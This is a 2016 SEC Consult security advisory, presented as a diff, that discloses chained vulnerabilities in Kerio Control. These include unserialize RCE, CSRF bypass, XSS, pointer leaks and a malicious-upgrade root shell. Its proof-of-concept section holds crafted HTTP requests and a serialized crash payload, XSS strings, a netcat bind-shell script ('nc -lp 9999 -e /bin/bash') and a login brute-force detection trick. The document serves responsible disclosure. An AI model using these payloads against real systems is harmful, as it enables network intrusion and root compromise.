@@ -1,0 +1,507 @@
+SEC Consult has also released a blog post describing the attack scenarios
+of the vulnerabilities within this advisory in detail and a video which
+shows the remote attack. Exploit code has been developed as well but will
+not be released for now.
+
+Blog:
+http://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html
+
+Video:
+https://www.youtube.com/watch?v=y_OWz25sHMI
+
+
+SEC Consult Vulnerability Lab Security Advisory < 20160922-0 >
+=======================================================================
+              title: Potential backdoor access through multiple vulnerabilities
+            product: Kerio Control Unified Threat Management
+ vulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1
+                     build 1324
+      fixed version: 9.1.3 (partially fixed, see vendor statement below)
+         CVE number: -
+             impact: critical
+           homepage: http://www.kerio.com/
+              found: 2016-08-24
+                 by: R. Freingruber (Office Vienna)
+                     R. Tavakoli (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Montreal - Moscow
+                     Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Protect your network from viruses, malware and malicious activity
+with Kerio Control, the easy-to-administer yet powerful all-in-one
+security solution.
+Kerio Control brings together next-generation firewall capabilities -
+including a network firewall and router, intrusion detection and
+prevention (IPS), gateway anti-virus, VPN, and web contentand
+application filtering. These comprehensive capabilities and unmatched
+deployment flexibility make Kerio Control the ideal choice for small
+and mid-sized businesses."
+
+Source: http://www.kerio.com/products/kerio-control
+
+
+Business recommendation:
+------------------------
+By combining the vulnerabilities documented in this advisory an attacker
+can fully compromise a network which uses the Kerio Control appliance for
+protection.
+
+The attacker can trick a victim to visit a malicious website which then conducts
+the internal attack. The attacked victim must be logged in or weak credentials
+must be configured which can be found with a bruteforce attack.
+
+The attacker will gain a reverse root shell from the Internet to the internal
+Kerio Control firewall system. Moreover, it's possible that an internal attacker
+uses the described vulnerabilities to escalate his privileges (low privileged
+account to full root shell) to steal credentials from other users on the UTM
+appliance.
+
+Most vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found
+in just two PHP scripts. Both scripts are not referenced by any other
+PHP script nor by any binary on the system.
+Both scripts contain a different(!), seemingly deliberate(?) CSRF bypass
+which make the vulnerabilities exploitable from the Internet to obtain a
+reverse root shell.
+
+SEC Consult recommends not to use Kerio Control until a thorough security
+review has been performed by security professionals and all identified
+issues have been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Unsafe usage of the PHP unserialize function and outdated PHP version leads
+   to remote-code-execution
+An authenticated user (standard user or administrator) can control data, which
+gets later unserialized. Kerio Control uses PHP 5.2.13 which was released on
+2010-02-25. This version is more than 6 years old and several bugs were found
+in the meantime within the unserialize function. The following CVE numbers
+are just some examples for vulnerabilities in unserialize which lead to remote
+code execution:
+  -) CVE-2014-8142
+  -) CVE-2014-3515
+  -) CVE-2015-0231
+  -) CVE-2015-6834
+  -) CVE-2016-5771
+  -) CVE-2016-5773
+
+PHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a
+type confusion attack to trigger a use-after-free vulnerability. It can be used
+to read data and get full code execution. In the case of Kerio Control the
+result of unserialize is not reflected back to the attacker. It's therefore not
+possible to read memory from the stack or heap (e.g. to bypass ASLR).
+
+Nevertheless, SEC Consult developed a fully working and reliable (blind) exploit
+for this vulnerability which spawns a reverse root shell to the Kerio Control
+system.
+For this exploit a user account is required. However, it's also possible to
+conduct the attack via the Internet because the CSRF (Cross Site Request
+Forgery) check can be bypassed (see below).
+
+An attacker can use this vulnerability to break into a company network via the
+Internet by tricking a logged in user to visit a malicious website. Even if the
+user is currently not logged in the attacker can start a bruteforce attack to
+obtain valid credentials to conduct the attack.
+
+
+2) PHP script allows heap spraying
+One of the PHP scripts allows the allocation of memory inside the main binary
+(winroute) of Kerio Control. Winroute contains the code of most services
+(e.g. the webserver, PHP, network related functionality, ...).
+The memory will not be freed after finishing the request and can therefore be
+used to spray payloads to the whole memory space.
+
+This vulnerability was used in the overall exploit to defeat ASLR.
+Please bear in mind that it's very likely that an attacker can write a working
+exploit without heap spraying. Fixing this vulnerability would therefore not
+prevent the exploitation of the remote code execution vulnerability.
+For example, the information disclosure vulnerability from this advisory can
+be used to bypass ASLR as well. This would eliminate the need of heap spraying.
+
+
+3) CSRF Protection Bypass
+The PHP scripts contain code to protect against CSRF (Cross Site Request
+Forgery) attacks. Because of the wrong usage of PHP binary
+operations and comparisons it's possible to bypass this check. That means
+that an attacker can trigger requests from other websites which will be handled
+by Kerio Control. This vulnerability allows to exploit the remote code
+execution vulnerability from the Internet to break into a network.
+
+
+4) Webserver running with root privileges
+The main binary (which contains the webserver and PHP) runs with root
+privileges.
+
+Kerio told SEC Consult that this vulnerability will not be fixed. SEC
+Consult strongly recommended otherwise.
+
+
+5) Reflected Cross Site Scripting (XSS)
+Kerio Control does not properly encode parameters which are reflected on the
+website. This leads to cross site scripting vulnerabilities.
+An attacker can abuse these vulnerabilities to modify the website or do actions
+in the context of the attacked user.
+
+
+6) Missing memory corruption protections
+The main binary (winroute) is not compiled as position-independent executable
+(PIE). This allowed the use of ROP (return-oriented-programming) code to
+bypass the not executable heap. Moreover, the stack is per default marked as
+executable, but the exact location of the stack is randomized by ASLR.
+
+
+7) Information Disclosure leads to ASLR bypass
+One of the PHP scripts leaks pointers to the stack and heap.
+This can be abused by attackers to bypass ASLR.
+Because stacks are marked as executable an attacker can therefore easily bypass
+ASLR and DEP/NX.
+
+
+8) Remote Code Execution as administrator
+Nearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code
+execution vulnerability in the administrative web interface in the upgrade
+functionality. This vulnerability is still unfixed, only the associated XSS
+vulnerability was fixed. However, an attacker can still exploit it from the
+Internet, e.g. by abusing the XSS vulnerability described in this advisory
+(where the CSRF check can be bypassed).
+
+With this vulnerability an attacker can gain a reverse root shell on
+Kerio Control again if a logged in administrator visits a malicious website
+on the Internet.
+More information can also be found in the old advisory:
+https://www.exploit-db.com/exploits/38450/
+
+
+9) Login not protected against brute-force attacks
+There are no bruteforce protections in place for the login.
+If an unauthenticated victim visits an attacker's website, the attacker can
+start a bruteforce attack to obtain valid credentials to execute the
+remote code execution exploit. Via image-loading the attacker can detect if
+the current credentials are valid (without violating SOP).
+
+
+Proof of concept:
+-----------------
+1) Unsafe usage of the PHP unserialize function and outdated PHP version leads
+   to remote-code-execution
+The following request can be used to set the unserialize data. In this example
+a faked string is used which points to 0xffffffff (kernel memory). Unserializing
+it will therefore crash the remote webserver (the winroute process).
+
+POST /set.php HTTP/1.1
+Host: $IP:4081
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Cookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 730
+
+k_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:"k_dbName";s:5:"error";s:11:"k_dbSummara";s:3:"abc";s:14:"k_dbIndividual";s:3:"abc";s:16:"k_dbLastUsedType";s:3:"abc";s:10:"k_dbLayout";s:3:"abc";s:10:"k_pageType";s:3:"abc";s:13:"k_periodStart";i:123;s:11:"k_periodEnd";i:123;s:8:"k_userId";i:123;s:6:"tabBar";i:123;s:13:"k_gotoElement";i:123;s:9:"k_protoId";i:123;s:11:"k_errorType";i:123;s:16:"k_timezoneOffset";i:123;s:9:"k_groupId";i:123;s:2:"id";i:123;s:11:"k_dbSummary";C:16:"SplObjectStorage":152:{x:i:2;O:8:"stdClass":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:"\ff\ff\ff\ff\20\00\00\00\01\00\00\00\06\00\00";i:1;R:3;}}s:18:"k_historyTimestamp";s:3:"abc";}
+
+The following request will call unserialize on the injected data:
+
+GET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1
+Host: $IP:4081
+Cookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;
+Connection: close
+
+In the example above only a denial of service will be conducted. However, an
+attacker can change the data type to object to get full code execution on
+the remote system.
+
+SEC Consult developed a fully working exploit for this attack which spawns a
+root shell. Please note that this exploit was intentionally written to just
+target Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets
+are used which belong to the winroute binary with the SHA256 hash:
+2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0
+This exploit will not be released for now.
+
+A real-world-attacker can detect the remote binary version by bruteforcing
+the object handler related to CVE-2014-3515.
+
+
+2) PHP script allows heap spraying
+The set.php script contains the following code:
+$p_variable = urldecode($_POST['k_variable']);
+$p_value = urldecode($_POST['k_value']);
+...
+$p_session->setSessionVariable($p_variable, $p_value);
+
+POST requests with the following parameters can therefore be used to allocate
+space on the remote system:
+k_securityHash=x&target=k_sessionVariable&k_variable=<random_name>
+&k_value=<payload_to_allocate>
+
+During tests it was possible to spray approximately 400 MB data in 30 seconds
+which is enough to control two predictable addresses on the heap.
+
+
+3) CSRF Protection Bypass
+Two scripts are required for the remote code execution exploit:
+  -) set.php
+  -) ContentLoader.php
+Both scripts contain different very interesting CSRF check bypasses.
+
+The following code can be found in set.php:
+$p_session->getCsrfToken(&$p_securityHash);
+$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];
+if ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {
+exit();
+}
+
+Since the programming language is PHP (and not JavaScript), the above code code
+does not work as expected. $p_postedHash can only become 0 or 1 because || is a
+logical operator. The if-condition compares the valid token with the posted one
+via the != operator, however, this will not check if types are the same.
+If k_securityHash is set (either via GET or POST) to any value, the above code
+will compare the number 1 with a string, which will always bypass the check.
+It's therefore enough to set k_securityHash to any value to bypass the CSRF
+protection.
+
+The following code can be found in contentLoader.php:
+$p_session->getCsrfToken(&$p_securityHash);
+$p_postedHash = $_GET['k_securityHash'];
+...
+if (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {
+$p_page = new p_Page();
+$p_page->p_jsCode('window.top.location = "index.php";');
+$p_page->p_showPageCode();
+die();
+}
+
+Now the programmers only use the GET parameter, however, they changed the
+logical operator in the if condition from || to && which means that the CSRF
+check will only be applied if $p_postedHash is empty. It's therefore again
+enough to set k_securityHash to any value to bypass the check.
+
+
+4) Webserver running with root privileges
+No proof of concept necessary.
+
+
+5) Reflected Cross Site Scripting (XSS)
+In the following request the k_historyTimestamp parameter is prone to XSS:
+https://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x
+&k_historyTimestamp=aa%22;alert(1)%3b//
+
+In the same request the id parameter can be used to inject JavaScript code.
+Note that the attack can only be conducted against administrative users.
+Users with standard privileges can only access pages with k_dbName set to one
+of the following values:
+  -) accStats
+  -) prefs
+  -) dialup
+  -) error
+
+In such a case Kerio Control adds code like the following
+(in this example k_dbName=dialup):
+var k_newDbName = "<kerio:text id="tabCaption_dialup"/>";
+
+The " characters within the string are not correctly encoded.
+This will lead to the termination of the JavaScript execution. Because the
+injected payload is stored after this code, the attacker must bypass this
+code to ensure that the payload gets executed. This is only possible if
+the attacked user is an administrator because administrators can load any
+dbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like
+the following will be added instead (which does not crash):
+var k_newDbName = "";
+
+Another XSS can be found at:
+https://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A"><script>alert(1);</script><!--
+
+
+6) Missing memory corruption protections
+No proof of concept necessary.
+
+
+7) Information Disclosure leads to ASLR bypass
+The following request returns information to the currently logged in user
+(e.g. session token and username):
+
+GET /nonauth/getLoginType.js.php HTTP/1.1
+Host: $IP:4081
+Cookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;
+Connection: close
+
+The following is a typical response:
+
+HTTP/1.1 200 OK
+Connection: Close
+Content-type: text/html
+Date: Tue, 24 Aug 2016 11:47:34 GMT
+Server: Kerio Control Embedded Web Server
+X-UA-Compatible: IE=edge
+
+k_loginParams.k_loginType = "loginUnlock";k_loginParams.k_nonauthToken =
+"0xb59066a8";k_loginParams.k_sessionToken =
+"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660";k_loginParams.k_loggedUser
+= {k_asocName: "user", k_fullName: "user"};
+
+The above response contains a valid pointer (0xb59066a8). In most cases this
+pointer will point to the heap. However, sometimes this pointer will point
+into a readable and writeable region behind a stack-region.
+The target location always stores the same data. During the analysis no
+further effort was spent on analysing this behaviour.
+
+The pointer will also be disclosed if the user is already logged out.
+In such a case the response looks like:
+
+HTTP/1.1 200 OK
+Connection: Close
+Content-type: text/html
+Date: Tue, 24 Aug 2016 12:04:44 GMT
+Server: Kerio Control Embedded Web Server
+X-UA-Compatible: IE=edge
+
+k_loginParams.k_loginType = "loginCommon";k_loginParams.k_nonauthToken =
+"0xb2ee208";
+
+
+An attack scenario can be:
+  -) The attacker tricks a victim to visit the attacker's malicious website
+  -) The attacker's website uses the CSRF bypass and the identified XSS
+     vulnerability to embed a malicious script inside the Kerio Control website
+  -) The attacker's website iframes the Kerio Control website to trigger the
+     execution of the XSS payload
+  -) The XSS payload runs on the same domain and can therefore send requests
+     and read responses. This means the attacker can send requests to
+     getLoginType.js.php to obtain a memory pointer.
+  -) If the memory pointer is within a specific range (e.g. the highest nibble
+     is zero), it's a pointer to the heap. In such a case the RCE vulnerability
+     can be used to crash and restart the server. After that the same check can
+     be done again.
+  -) If the memory pointer points near a stack (highest nibble is 0xb), the
+     pointer can be used to calculate the base address of a stack.
+  -) Now the attacker knows the location of a stack (all stacks are marked as
+     readable, writeable and executable). He can now easily bypass ASLR and DEP.
+
+
+8) Remote Code Execution as administrator
+An attacker can create a malicious upgrade image with the following
+commands:
+cat upgrade.sh
+#!/bin/bash
+nc -lp 9999 -e /bin/bash &
+
+tar czf upgrade.tar.gz *
+mv upgrade.tar.gz upgrade.img
+
+The image can be uploaded in the administrative web interface.
+This will bind a root shell on port 9999. The complete attack can also be
+conducted via the cross site scripting vulnerability described in this
+advisory (XSS in contentLoader.php). This enables an attacker to conduct
+the attack from the Internet to obtain a reverse shell on Kerio Control.
+
+
+9) Login not protected against brute-force attacks
+Valid credentials can be obtained via a brute-force attack.
+It's enough to send a POST request to /internal/dologin.php with the
+parameters kerio_username and kerio_password set. A remote attacker
+can detect if the credentials are correct without reading the
+response (SOP would not allow to read the response). This is possible
+because /internal/photo will only return a valid image if the user is
+currently logged in. The attacker can load an image from this URL and
+check if loading was successful to leak the information if the
+credentials are valid or not.
+The following code demonstrates this:
+<img src="https://<Kerio-IP>/internal/photo" onerror=not_logged_in();
+onload=logged_in();></img>
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following product versions were found to be vulnerable which were the
+latest versions available at the time of the discovery:
+v9.1.0 (Build 1087)
+v9.1.1 (Build 1324)
+
+
+Vendor contact timeline:
+------------------------
+2016-08-29: Contacting vendor through website
+            (bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664
+2016-08-31: No answer, contacting CTO of Kerio via email
+2016-09-01: Received security contact with PGP & S/MIME certificate
+2016-09-01: Transmission of PGP encrypted advisory to Kerio
+2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7
+            Statement to vulnerability 9:
+            "the feature already is in the product."
+            Statement to vulnerabilities 4 (Webserver running with root
+            privileges) and 8 (Remote Code Execution as administrator):
+            "I do not consider this a vulnerability"
+            Update including a fix will be available on 2016-09-20
+2016-09-09: SEC Consult informed Kerio to re-think the decision
+            not fixing the vulnerabilities 4, 8 and 9
+            SEC Consult highly recommends to fix all reported issues
+2016-09-13: SEC Consult informed Kerio that the advisory will be
+            released on 2016-09-22
+2016-09-20: Kerio releases patch for Kerio Control
+2016-09-22: Coordianted release of security advisory
+
+
+Solution:
+---------
+The vendor has released version 9.1.3 on 20th September which, according
+to the vendor, fixes the vulnerabilities 1,2,3,5,6,7.
+
+The vendor told us the following regarding vulnerability 9:
+"the feature already is in the product"
+
+Vulnerability 4 and 8 are not considered a vulnerability by the vendor
+and will not be fixed.
+SEC Consult strongly recommended fixing issue 4 and 8 as well.
+
+The latest version can be downloaded from here:
+http://www.kerio.com/support/kerio-control
+http://www.kerio.com/support/kerio-control/release-history
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Montreal - Moscow
+Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF R. Freingruber / @2016
